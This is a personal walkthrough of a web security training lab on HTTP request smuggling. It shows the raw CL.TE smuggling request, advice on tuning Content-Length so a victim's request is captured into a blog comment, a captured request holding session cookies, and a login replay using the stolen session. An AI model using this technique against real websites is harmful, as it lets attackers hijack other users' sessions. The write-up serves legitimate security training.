Exploiting HTTP request smuggling to capture other users' requests

To say that this lab is annoying and buggy would be an understatement, but for the sake of keeping this safe for work I'll keep it at that.
Here's how the request is supposed to look like:

POST / HTTP/1.1
Host: ac171fde1f0b492d80914bc800ab0064.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 275
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 682
Cookie: session=xHHr5ga5Wo6foRElPvzxnZsL5I1BOocB

csrf=gd5hkCE9kSHyC2konsUNrgT9O9HHEExb&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test

No carriage return here. Pay attention to the postId (5). The cookie and csrf token can be found by commenting on a blog post. Send the request until you get a 200 response. The smuggled request will be primed now.
What makes (and break) this attack is the content lentgh in the 2nd POST request. Around 680-685 has been the sweet spot from my experience, but you can go down to 400-500 to test if it's working. If carlos makes a request that's shorter than your lenght, it will not show up and instead you'll smuggle your own request in.
There is a way to test if you've gone too far by waiting 1-2 minutes, refreshing the comment page and observing the comments. Carlos's comments look like this:

testGET / HTTP/1.1 Host: ac171fde1f0b492d80914bc800ab0064.web-security-academy.net Connection: keep-alive Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate, br Cookie: victim-fingerprint=SGerRqlPu9Fh3RiyK8TVkuuOsuz3zzVe; secret=1w3yBjsOjPls0dFMQMMBtf1H2ykEbkSI; session=h8fK0JPoVHrartkIrIW4TRMhmVlLWEXU 

If that doesn't show up, cut down the content-length. But beware the the lab has a tendency to bug out and not make requests anymore. I'd just wait for it to expire and try again.

Rembember that you're looking for Carlos's session cookie and it's 32 characters long. Ignore the rest.
Once you have it, the next hell begins.


Now you'll have to "log in" as carlos. This doesn't really work well at all. Here's the request:

POST /login HTTP/1.1
Host: ac171fde1f0b492d80914bc800ab0064.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Origin: https://ac171fde1f0b492d80914bc800ab0064.web-security-academy.net
Connection: close
Referer: https://ac171fde1f0b492d80914bc800ab0064.web-security-academy.net/login
Cookie: session=h8fK0JPoVHrartkIrIW4TRMhmVlLWEXU
Upgrade-Insecure-Requests: 1

csrf=gd5hkCE9kSHyC2konsUNrgT9O9HHEExb&username=carlos&password=123456

Use carlos's session cookie and your csrf token. Remember to move fast as the csrf token can expire.
Intercept the login, do the changes and forward it. You might get an invalid CSRF token or a session expired. Check if the lab complete prompt showed up.
If it hasn't, do it a few more times. I've never seen it return a valid result. If it still doesn't work, wait for the lab to expire (15 minutes) and repeat the whole process. 
Question your sanity and why you're doing this. Yeah, this is not a great lab.

Good luck, you'll need it.

